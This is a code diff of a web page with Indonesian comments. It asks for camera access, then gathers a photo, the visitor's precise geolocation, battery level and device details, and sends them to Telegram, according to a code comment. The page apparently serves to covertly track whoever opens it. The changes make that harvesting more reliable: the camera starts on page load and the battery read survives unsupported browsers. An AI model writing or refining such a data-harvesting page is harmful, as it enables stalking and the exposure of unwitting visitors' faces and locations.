@@ -17,15 +17,16 @@
     const captureButton = document.getElementById('capture-btn');
 
     // Meminta akses ke kamera
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then((stream) => {
+    async function initCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
         video.onloadedmetadata = () => video.play();
-      })
-      .catch((err) => {
+      } catch (err) {
         console.error('Error accessing camera:', err);
         alert('Tidak dapat mengakses kamera. Pastikan Anda memberikan izin.');
-      });
+      }
+    }
 
     // Fungsi untuk mengambil foto dan mengirim data
     captureButton.onclick = async () => {
@@ -43,8 +44,11 @@
         const position = await getLocation();
         const { latitude, longitude, accuracy } = position.coords;
 
-        // Mendapatkan informasi baterai
-        const batteryInfo = await getBatteryInfo();
+        // Mendapatkan informasi baterai (jika didukung)
+        let batteryInfo = { level: null };
+        if ("getBattery" in navigator) {
+          batteryInfo = await getBatteryInfo();
+        }
 
         // Mendapatkan informasi perangkat
         const deviceInfo = {
@@ -52,7 +56,7 @@
           screenWidth: window.screen.width,
           screenHeight: window.screen.height,
           platform: navigator.platform,
-          batteryLevel: batteryInfo.level * 100,
+          batteryLevel: batteryInfo.level ? batteryInfo.level * 100 : 'Tidak didukung',
         };
 
         // Mengirim data ke Telegram
@@ -116,6 +120,9 @@
       }
       return new Blob([ab], { type: mimeString });
     }
+
+    // Inisialisasi kamera saat halaman dimuat
+    initCamera();
   </script>
 </body>
 </html>
